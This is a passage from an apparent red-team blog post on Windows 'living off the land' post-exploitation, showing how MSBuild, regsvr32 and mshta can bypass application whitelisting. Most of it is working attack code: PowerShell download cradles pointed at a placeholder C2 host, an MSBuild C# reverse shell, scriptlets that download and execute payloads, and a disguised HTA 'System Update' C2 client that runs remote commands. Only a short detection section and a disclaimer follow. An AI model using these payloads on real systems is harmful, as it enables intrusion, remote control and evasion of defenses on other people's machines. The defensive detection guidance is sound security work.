makes MSBuild so powerful for attackers: it can execute inline C# code embedded in XML project files. The build process includes a feature called \"inline tasks\" that allows you to define and execute .NET code directly within the build file. We can abuse this to run arbitrary C# code without compiling a separate executable.\u003c/p\u003e\n\u003cp\u003eLet me show you how this works. First, we create an MSBuild project file with embedded C# code:\u003c/p\u003e\n\u003cpre class=\"language-xml\"\u003e\u003ccode class=\"language-xml\"\u003e\u0026#x3C;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u003e\n  \u0026#x3C;!-- Define a target that will execute when the project is built --\u003e\n  \u0026#x3C;Target Name=\"Execute\"\u003e\n    \u0026#x3C;ClassExample /\u003e\n  \u0026#x3C;/Target\u003e\n\n  \u0026#x3C;!-- Define an inline task with C# code --\u003e\n  \u0026#x3C;UsingTask\n    TaskName=\"ClassExample\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\"\u003e\n    \u0026#x3C;Task\u003e\n      \u0026#x3C;Code Type=\"Class\" Language=\"cs\"\u003e\n      \u0026#x3C;![CDATA[\n        using System;\n        using System.Diagnostics;\n        using Microsoft.Build.Framework;\n        using Microsoft.Build.Utilities;\n\n        public class ClassExample : Task\n        {\n            public override bool Execute()\n            {\n                // Your malicious code here\n                // This example just launches calc.exe, but you could do anything\n                Process.Start(\"calc.exe\");\n\n                // Or execute PowerShell\n                Process.Start(new ProcessStartInfo()\n                {\n                    FileName = \"powershell.exe\",\n                    Arguments = \"-NoProfile -Command \\\"IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')\\\"\",\n                    UseShellExecute = false,\n                    CreateNoWindow = true\n                });\n\n                return true;\n            }\n        }\n      ]]\u003e\n      \u0026#x3C;/Code\u003e\n    \u0026#x3C;/Task\u003e\n  \u0026#x3C;/UsingTask\u003e\n\u0026#x3C;/Project\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me break down what's happening here. The \u003ccode\u003e\u0026#x3C;UsingTask\u003e\u003c/code\u003e element defines an inline task using the CodeTaskFactory, which allows us to write C# code directly in the XML. The \u003ccode\u003e\u0026#x3C;Code\u003e\u003c/code\u003e section contains a full C# class that inherits from the Task class. The \u003ccode\u003eExecute()\u003c/code\u003e method is where our code runs - in this example, I'm launching calc.exe and then executing a PowerShell download cradle.\u003c/p\u003e\n\u003cp\u003eTo execute this, save the XML to a file (let's call it \u003ccode\u003ebuild.xml\u003c/code\u003e) and run:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute the MSBuild project\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\temp\\build.xml\n\n# Or for 64-bit systems\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\temp\\build.xml\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen MSBuild processes this file, it compiles the C# code in memory and executes it. From an application whitelisting perspective, this looks completely legitimate - MSBuild.exe is a trusted Microsoft binary doing what it's designed to do.\u003c/p\u003e\n\u003cp\u003eThe power of this technique is that you can execute any .NET code you want. You could download and execute additional payloads, implement a full reverse shell, execute shellcode through P/Invoke, access Windows APIs for privilege escalation, or perform reconnaissance and data collection. The possibilities are limited only by what you can do in C# code.\u003c/p\u003e\n\u003cp\u003eHere's a more advanced example that implements a reverse shell:\u003c/p\u003e\n\u003cpre class=\"language-xml\"\u003e\u003ccode class=\"language-xml\"\u003e\u0026#x3C;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u003e\n  \u0026#x3C;Target Name=\"Execute\"\u003e\n    \u0026#x3C;ReverseShell /\u003e\n  \u0026#x3C;/Target\u003e\n  \u0026#x3C;UsingTask TaskName=\"ReverseShell\" TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\"\u003e\n    \u0026#x3C;Task\u003e\n      \u0026#x3C;Code Type=\"Class\" Language=\"cs\"\u003e\n      \u0026#x3C;![CDATA[\n        using System;\n        using System.Net;\n        using System.Net.Sockets;\n        using System.Text;\n        using System.IO;\n        using System.Diagnostics;\n        using Microsoft.Build.Framework;\n        using Microsoft.Build.Utilities;\n\n        public class ReverseShell : Task\n        {\n            public override bool Execute()\n            {\n                try\n                {\n                    // Connect to attacker's server\n                    using (TcpClient client = new TcpClient(\"attacker-ip\", 4444))\n                    {\n                        using (Stream stream = client.GetStream())\n                        {\n                            using (StreamReader reader = new StreamReader(stream))\n                            using (StreamWriter writer = new StreamWriter(stream))\n                            {\n                                writer.AutoFlush = true;\n\n                                // Send initial banner\n                                writer.WriteLine(\"MSBuild shell connected from \" + Environment.MachineName);\n\n                                // Command loop\n                                while (true)\n                                {\n                                    writer.Write(\"MSBuild\u003e \");\n                                    string command = reader.ReadLine();\n                                    if (string.IsNullOrEmpty(command)) break;\n\n                                    if (command.ToLower() == \"exit\") break;\n\n                                    // Execute command\n                                    Process proc = new Process();\n                                    proc.StartInfo.FileName = \"cmd.exe\";\n                                    proc.StartInfo.Arguments = \"/c \" + command;\n                                    proc.StartInfo.UseShellExecute = false;\n                                    proc.StartInfo.RedirectStandardOutput = true;\n                                    proc.StartInfo.RedirectStandardError = true;\n                                    proc.Start();\n\n                                    string output = proc.StandardOutput.ReadToEnd();\n                                    string error = proc.StandardError.ReadToEnd();\n                                    proc.WaitForExit();\n\n                                    writer.WriteLine(output);\n                                    if (!string.IsNullOrEmpty(error))\n                                        writer.WriteLine(\"Error: \" + error);\n                                }\n                            }\n                        }\n                    }\n                }\n                catch (Exception ex)\n                {\n                    // Silently fail - don't want to alert anyone\n                }\n                return true;\n            }\n        }\n      ]]\u003e\n      \u0026#x3C;/Code\u003e\n    \u0026#x3C;/Task\u003e\n  \u0026#x3C;/UsingTask\u003e\n\u0026#x3C;/Project\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a reverse TCP shell that connects back to your attacker machine. When you run it with MSBuild, you get an interactive shell, all through a trusted Microsoft binary.\u003c/p\u003e\n\u003cp\u003eWhat's important to understand is that MSBuild is compiling this code at runtime. The C# code never exists as a compiled .exe or .dll on disk - it's compiled in memory and executed immediately. This makes it very difficult for traditional antivirus to detect because there's no file to scan.\u003c/p\u003e\n\u003ch3\u003eRegsvr32: Remote Scriptlet Execution\u003c/h3\u003e\n\u003cp\u003eRegsvr32.exe is the Windows utility for registering and unregistering COM DLLs. It's another signed Microsoft binary that's whitelisted by default. What makes it interesting for bypassing application whitelisting is a lesser-known feature: it can fetch and execute scriptlets from remote URLs.\u003c/p\u003e\n\u003cp\u003eA scriptlet is a COM object defined in XML with embedded script code (JScript or VBScript). Regsvr32 can download these scriptlets from HTTP/HTTPS URLs and execute the embedded script. This gives us remote code execution through a completely legitimate Windows binary.\u003c/p\u003e\n\u003cp\u003eHere's how it works. First, you create a .sct (scriptlet) file on your web server:\u003c/p\u003e\n\u003cpre class=\"language-xml\"\u003e\u003ccode class=\"language-xml\"\u003e\u0026#x3C;?XML version=\"1.0\"?\u003e\n\u0026#x3C;scriptlet\u003e\n  \u0026#x3C;registration\n    description=\"Bypass\"\n    progid=\"Bypass\"\n    version=\"1.00\"\n    classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\"\n    remotable=\"true\"\u003e\n  \u0026#x3C;/registration\u003e\n\n  \u0026#x3C;script language=\"JScript\"\u003e\n    \u0026#x3C;![CDATA[\n      // This code runs when the scriptlet is loaded\n      var shell = new ActiveXObject(\"WScript.Shell\");\n\n      // Execute calc.exe as a test\n      shell.Run(\"calc.exe\");\n\n      // Or execute PowerShell for real payload delivery\n      var command = 'powershell.exe -NoProfile -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(\\'http://your-c2.com/payload.ps1\\')\"';\n      shell.Run(command, 0, false);\n\n      // Can also create scheduled tasks, modify registry, etc.\n    ]]\u003e\n  \u0026#x3C;/script\u003e\n\u0026#x3C;/scriptlet\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSave this as \u003ccode\u003ebypass.sct\u003c/code\u003e on your web server. Then on the target system, execute:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Download and execute the remote scriptlet\nregsvr32.exe /s /n /u /i:http://your-server.com/bypass.sct scrobj.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLet me explain these flags. The \u003ccode\u003e/s\u003c/code\u003e parameter runs in silent mode without showing message boxes. The \u003ccode\u003e/n\u003c/code\u003e flag tells regsvr32 not to call DllRegisterServer since we're not actually registering a DLL. The \u003ccode\u003e/u\u003c/code\u003e flag puts it in unregister mode, which combined with \u003ccode\u003e/n\u003c/code\u003e just loads the scriptlet without trying to register anything. The \u003ccode\u003e/i:http://...\u003c/code\u003e parameter specifies the URL to the scriptlet. Finally, \u003ccode\u003escrobj.dll\u003c/code\u003e is the Windows Script Component runtime DLL that handles the actual scriptlet execution.\u003c/p\u003e\n\u003cp\u003eWhen you run this command, regsvr32 downloads the scriptlet from your server and executes the embedded JScript code. From a network perspective, this looks like a normal HTTP/HTTPS request. From a process perspective, it's regsvr32.exe - a trusted Microsoft binary - doing what it's designed to do.\u003c/p\u003e\n\u003cp\u003eThe scriptlet can do anything that JScript or VBScript can do with ActiveX objects, which is actually quite a lot. You can execute commands via WScript.Shell, create and manipulate files with FileSystemObject, make HTTP requests with XMLHTTP or WinHttp objects, modify the registry, create scheduled tasks, and download additional payloads. Essentially, you have full system access through scripting languages that are built into Windows.\u003c/p\u003e\n\u003cp\u003eHere's a more sophisticated example that implements a download-and-execute pattern:\u003c/p\u003e\n\u003cpre class=\"language-xml\"\u003e\u003ccode class=\"language-xml\"\u003e\u0026#x3C;?XML version=\"1.0\"?\u003e\n\u0026#x3C;scriptlet\u003e\n  \u0026#x3C;registration\n    description=\"Downloader\"\n    progid=\"Downloader\"\n    version=\"1.00\"\n    classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\"\u003e\n  \u0026#x3C;/registration\u003e\n\n  \u0026#x3C;script language=\"JScript\"\u003e\n    \u0026#x3C;![CDATA[\n      function DownloadAndExecute(url, filename) {\n        try {\n          // Create XMLHTTP object for downloading\n          var xhr = new ActiveXObject(\"MSXML2.XMLHTTP\");\n          xhr.open(\"GET\", url, false);\n          xhr.send();\n\n          // Save to temp directory\n          var stream = new ActiveXObject(\"ADODB.Stream\");\n          stream.Type = 1; // Binary\n          stream.Open();\n          stream.Write(xhr.ResponseBody);\n\n          var tempDir = new ActiveXObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\");\n          var filepath = tempDir + \"\\\\\" + filename;\n          stream.SaveToFile(filepath, 2); // Overwrite\n          stream.Close();\n\n          // Execute the downloaded file\n          var shell = new ActiveXObject(\"WScript.Shell\");\n          shell.Run(filepath, 0, false);\n\n        } catch(e) {\n          // Silently fail\n        }\n      }\n\n      // Execute on load\n      DownloadAndExecute(\"http://your-c2.com/payload.exe\", \"update.exe\");\n    ]]\u003e\n  \u0026#x3C;/script\u003e\n\u0026#x3C;/scriptlet\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis scriptlet downloads a binary from your C2 server and executes it. The downloaded file does touch disk, but only after you've already bypassed application whitelisting to execute the scriptlet.\u003c/p\u003e\n\u003cp\u003eOne important note: regsvr32 is 32-bit by default on 64-bit systems. If you need 64-bit execution, use:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003eC:\\Windows\\System32\\regsvr32.exe /s /n /u /i:http://your-server.com/bypass.sct scrobj.dll\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eMshta: HTML Application Execution\u003c/h3\u003e\n\u003cp\u003eMshta.exe is the Windows utility for executing HTML Application (.hta) files. HTA files are essentially HTML pages with full access to Windows APIs through ActiveX objects. Mshta is signed by Microsoft and whitelisted by default because it's a legitimate Windows component.\u003c/p\u003e\n\u003cp\u003eWhat makes mshta perfect for bypassing application whitelisting is that it can execute HTA files from remote URLs, and HTA files can contain VBScript or JScript with full system access. It's essentially a browser that runs with no sandbox restrictions.\u003c/p\u003e\n\u003cp\u003eHere's a basic HTA file:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html\u003e\n\u0026#x3C;head\u003e\n  \u0026#x3C;title\u003eWindows Update\u0026#x3C;/title\u003e\n  \u0026#x3C;HTA:APPLICATION\n    ID=\"WindowsUpdate\"\n    APPLICATIONNAME=\"Windows Update\"\n    BORDER=\"none\"\n    CAPTION=\"no\"\n    SHOWINTASKBAR=\"no\"\n    WINDOWSTATE=\"minimize\"\n  /\u003e\n\n  \u0026#x3C;script language=\"VBScript\"\u003e\n    Sub Window_OnLoad\n      ' This code runs when the HTA loads\n      Dim objShell\n      Set objShell = CreateObject(\"WScript.Shell\")\n\n      ' Execute calc.exe as a test\n      objShell.Run \"calc.exe\", 0, False\n\n      ' Execute PowerShell for real payload\n      Dim command\n      command = \"powershell.exe -NoProfile -WindowStyle Hidden -Command \"\"IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')\"\"\"\n      objShell.Run command, 0, False\n\n      ' Close the HTA window\n      window.close()\n    End Sub\n  \u0026#x3C;/script\u003e\n\u0026#x3C;/head\u003e\n\u0026#x3C;body\u003e\n  \u0026#x3C;div\u003eLoading...\u0026#x3C;/div\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSave this as \u003ccode\u003eupdate.hta\u003c/code\u003e on your web server. Execute it on the target with:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Execute remote HTA file\nmshta.exe http://your-server.com/update.hta\n\n# Or use vbscript: protocol for inline execution\nmshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc.exe\"\", 0\"))\n\n# JavaScript variant\nmshta.exe javascript:a=(GetObject(\"script:http://your-server.com/payload.js\")).Run();close();\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003evbscript:\u003c/code\u003e and \u003ccode\u003ejavascript:\u003c/code\u003e protocol handlers are particularly interesting because they let you execute code inline without even fetching a remote file:\u003c/p\u003e\n\u003cpre class=\"language-powershell\"\u003e\u003ccode class=\"language-powershell\"\u003e# Inline VBScript execution\nmshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://your-c2.com/payload.ps1')\"\", 0:close\")\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis entire command executes without creating any files on disk. The VBScript code is parsed and executed directly from the command line.\u003c/p\u003e\n\u003cp\u003eHere's a more complete HTA example that implements a basic C2 client:\u003c/p\u003e\n\u003cpre class=\"language-html\"\u003e\u003ccode class=\"language-html\"\u003e\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html\u003e\n\u0026#x3C;head\u003e\n  \u0026#x3C;title\u003eSystem Update\u0026#x3C;/title\u003e\n  \u0026#x3C;HTA:APPLICATION\n    ID=\"SystemUpdate\"\n    APPLICATIONNAME=\"System Update\"\n    BORDER=\"none\"\n    CAPTION=\"no\"\n    SHOWINTASKBAR=\"no\"\n    WINDOWSTATE=\"minimize\"\n    SCROLL=\"no\"\n  /\u003e\n\n  \u0026#x3C;script language=\"VBScript\"\u003e\n    ' Simple C2 client that beacons to server and executes commands\n    Dim objShell, objHTTP, serverURL\n    Set objShell = CreateObject(\"WScript.Shell\")\n    Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP\")\n    serverURL = \"http://your-c2.com/command\"\n\n    Sub Window_OnLoad\n      ' Start beacon loop\n      BeaconLoop()\n    End Sub\n\n    Sub BeaconLoop()\n      On Error Resume Next\n\n      ' Send beacon to server\n      objHTTP.Open \"GET\", serverURL \u0026#x26; \"?id=\" \u0026#x26; objShell.ExpandEnvironmentStrings(\"%COMPUTERNAME%\"), False\n      objHTTP.Send\n\n      If objHTTP.Status = 200 Then\n        Dim command\n        command = objHTTP.ResponseText\n\n        If Len(command) \u003e 0 Then\n          If command = \"exit\" Then\n            window.close()\n            Exit Sub\n          End If\n\n          ' Execute the command\n          Dim result\n          result = ExecuteCommand(command)\n\n          ' Send result back to server\n          objHTTP.Open \"POST\", serverURL \u0026#x26; \"/result\", False\n          objHTTP.Send result\n        End If\n      End If\n\n      ' Wait 5 seconds before next beacon\n      window.setTimeout \"BeaconLoop()\", 5000, \"VBScript\"\n    End Sub\n\n    Function ExecuteCommand(cmd)\n      On Error Resume Next\n      Dim objExec, output\n      Set objExec = objShell.Exec(cmd)\n\n      ' Read output\n      output = objExec.StdOut.ReadAll()\n      If Len(output) = 0 Then\n        output = objExec.StdErr.ReadAll()\n      End If\n\n      ExecuteCommand = output\n    End Function\n  \u0026#x3C;/script\u003e\n\u0026#x3C;/head\u003e\n\u0026#x3C;body bgcolor=\"#000000\"\u003e\n  \u0026#x3C;div style=\"color:#fff;\"\u003eUpdating system components...\u0026#x3C;/div\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis HTA implements a simple beacon-based C2 client. It polls your server for commands, executes them, and sends the results back. All of this happens through mshta.exe, a signed Microsoft binary.\u003c/p\u003e\n\u003ch3\u003eWhy These Techniques Work\u003c/h3\u003e\n\u003cp\u003eThe reason these application whitelisting bypasses are so effective is that they exploit the dual-use nature of legitimate Windows utilities. MSBuild is designed to compile code, regsvr32 is designed to load and execute COM objects, and mshta is designed to run HTML applications with system access.\u003c/p\u003e\n\u003cp\u003eFrom an application whitelisting perspective, blocking these utilities is difficult because developers need MSBuild for building .NET applications, system administrators use regsvr32 for managing COM components, and some legacy applications use HTA files for legitimate purposes.\u003c/p\u003e\n\u003cp\u003eOrganizations that try to block these binaries often find that they break legitimate business functionality. This creates a dilemma for defenders: allow these tools and accept the risk, or block them and deal with compatibility issues.\u003c/p\u003e\n\u003cp\u003eModern application whitelisting solutions have started implementing additional controls such as blocking execution from user-writable directories, restricting network access for these binaries, monitoring for suspicious command-line arguments, and implementing parent-child process restrictions.\u003c/p\u003e\n\u003cp\u003eBut even with these controls, creative attackers can often find ways to abuse these binaries. The fundamental issue is that these are legitimate, necessary Windows components with powerful capabilities.\u003c/p\u003e\n\u003ch3\u003eDetection and Mitigation\u003c/h3\u003e\n\u003cp\u003eFrom a blue team perspective, detecting abuse of these binaries requires monitoring for unusual patterns. For MSBuild, watch for execution from unexpected locations like user directories or temp folders, unusual parent processes (it should typically be Visual Studio or build automation), network connections from MSBuild.exe, and command-line arguments pointing to XML files in suspicious locations.\u003c/p\u003e\n\u003cp\u003eFor Regsvr32, monitor network connections especially to external IPs, command-line arguments with /i: pointing to URLs, execution with the scrobj.dll parameter, and unusual parent processes. For Mshta, look for network connections to external servers, command-line arguments with http://, vbscript:, or javascript:, execution from unusual parent processes, and child processes spawned by mshta.exe.\u003c/p\u003e\n\u003cp\u003eSecurity teams should monitor Windows Event ID 4688 (process creation) with command-line auditing enabled to catch these techniques. Sysmon is even better because it provides detailed process creation, network connection, and parent-process information.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eLiving off the land has fundamentally changed how I approach red team engagements. Instead of dropping tools and hoping they don't get detected, I work entirely within the normal operating environment of Windows systems. I use the same tools that system administrators use every day - PowerShell for automation and management, WMI for remote system queries, certutil for certificate operations, scheduled tasks for maintenance operations, and dozens of other legitimate Windows utilities.\u003c/p\u003e\n\u003cp\u003eWhat makes this approach so powerful isn't just that it avoids signature-based detection. It's that it forces defenders to shift from simply blocking known-bad tools to analyzing behavior and distinguishing malicious intent from legitimate administrative activity. This is an incredibly difficult problem for defenders to solve.\u003c/p\u003e\n\u003cp\u003eThroughout this article, we've covered the complete lifecycle of a post-exploitation operation using only native Windows tools. We started with reconnaissance - understanding the system we've compromised, enumerating domain structure, and identifying targets for lateral movement. We moved through credential harvesting techniques like LSASS memory dumping with rundll32 and comsvcs.dll, registry hive extraction, and searching for credentials in files and PowerShell history.\u003c/p\u003e\n\u003cp\u003eWe explored multiple lateral movement techniques - PowerShell Remoting for modern Windows management, WMI for broader compatibility, DCOM for stealthy execution, scheduled tasks for persistence and execution, and service-based techniques for SYSTEM-level access. Each technique has its place depending on the target environment, your objectives, and the level of monitoring you're facing.\u003c/p\u003e\n\u003cp\u003eFor persistence, we looked at methods ranging from simple registry run keys and startup folder modifications to sophisticated WMI event subscriptions that trigger based on system events. The key with persistence is choosing methods that blend in with the normal system configuration and are unlikely to be discovered during routine administration.\u003c/p\u003e\n\u003cp\u003eFinally, we covered data exfiltration using HTTP/HTTPS with PowerShell, certutil for file transfers, BITS for resumable background transfers, SMB for direct file copying, DNS for stealthy data tunneling, and email for leveraging existing communication channels.\u003c/p\u003e\n\u003cp\u003eFrom a defender's perspective, detecting these techniques requires a fundamental shift in approach. You can't rely on signature-based detection when attackers are using signed Microsoft binaries doing what they're designed to do. Instead, you need comprehensive logging - PowerShell script block logging, command-line process auditing, WMI activity monitoring, and Sysmon for detailed system activity. You need behavioral analytics that can identify suspicious patterns like PowerShell downloading and executing scripts from the internet, WMI being used to create processes on remote systems at unusual times, scheduled tasks being created with suspicious command lines, or abnormal data transfer patterns that might indicate exfiltration.\u003c/p\u003e\n\u003cp\u003eThe cat-and-mouse game between red and blue teams continues to evolve. As defenders get better at detecting specific living-off-the-land techniques, attackers find new ways to abuse legitimate functionality. The techniques in this article represent current best practices, but they're not static - both offensive and defensive capabilities continue to advance.\u003c/p\u003e\n\u003cp\u003eOne thing I've learned from years of red teaming is that technical sophistication only gets you so far. The most successful operations combine technical skill with operational security discipline. It doesn't matter how stealthy your techniques are if you leave obvious traces, work during suspicious hours, or exfiltrate terabytes of data in a single burst. Success requires understanding not just how to execute techniques, but when to use them, what logs they create, and how to make your activity blend in with legitimate operations.\u003c/p\u003e\n\u003cp\u003eRemember that everything in this article should only be used in authorized security assessments, penetration tests, and red team engagements. Unauthorized access to computer systems is illegal and unethical. Always operate within proper legal and ethical boundaries, maintain clear authorization documentation, and follow responsible disclosure practices for any vulnerabilities you discover.\u003c/p\u003e\n\u003ch2\u003eReferences\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://lolbas-project.github.io/\"\u003eLOLBAS Project\u003c/a\u003e - Comprehensive database of Living Off the Land binaries and scripts\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://attack.mitre.org/tactics/TA0002/\"\u003eMITRE ATT\u0026#x26;CK - Execution\u003c/a\u003e - Execution tactics and techniques\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://attack.mitre.org/tactics/TA0003/\"\u003eMITRE ATT\u0026#x26;CK - Persistence\u003c/a\u003e - Persistence mechanisms\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://attack.mitre.org/tactics/TA0008/\"\u003eMITRE ATT\u0026#x26;CK - Lateral Movement\u003c/a\u003e - Lateral movement techniques\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.microsoft.com/en-us/powershell/\"\u003ePowerShell Documentation\u003c/a\u003e - Official Microsoft PowerShell documentation\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\"\u003eWindows Sysinternals Sysmon\u003c/a\u003e - System monitoring and logging tool\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://devblogs.microsoft.com/powershell/powershell-the-blue-team/\"\u003ePowerShell ‚ô• the Blue Team\u003c/a\u003e - PowerShell security features and logging\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://adsecurity.org/\"\u003eActive Directory Security\u003c/a\u003e - Active Directory attack and defense techniques\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"http://blog.harmj0y.net/\"\u003eHarmj0y's Blog\u003c/a\u003e - Advanced PowerShell and AD techniques\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504\"\u003eRed Team Field Manual\u003c/a\u003e - Quick reference for offensive operations\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"I'll never forget one of my first red team engagements where I learned this lesson the hard way. I'd spent two days carefully phishing my way into a financia...","title":"Living Off the Land: Windows Post-Exploitation Without Tools","date":"2025-11-28","tags":["Post-Exploitation","Windows","Red Team","PowerShell","LOLBins","Lateral Movement","Offensive Security"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"living-off-the-land-windows"},"buildId":"dwOljWfoZZJToQyW6QLtd","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>